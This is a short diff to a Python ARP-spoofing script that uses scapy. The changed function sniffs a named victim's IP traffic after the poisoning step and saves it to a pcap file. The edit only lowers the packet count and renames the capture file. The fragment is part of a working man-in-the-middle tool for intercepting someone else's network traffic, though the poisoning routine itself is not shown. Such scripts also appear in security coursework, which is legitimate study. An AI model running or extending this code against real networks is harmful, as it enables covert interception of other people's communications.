@@ -28,11 +28,11 @@ def poison(victim, victimmac, gateway, gatewaymac):
             break
 
 
-def sniff_packets(victim, interface, gateway, count=100):
+def sniff_packets(victim, interface, gateway, count=50):
     time.sleep(5)
     bpf_filter = f"ip host {victim}"
     packets = sniff(count=count, filter=bpf_filter, iface=interface)
-    wrpcap('arper.pcap', packets)
+    wrpcap('target_pcap.pcap', packets)
     print('Got the packets')
     restore(victim, get_mac(victim), gateway, get_mac(gateway))
     print('Finished.')
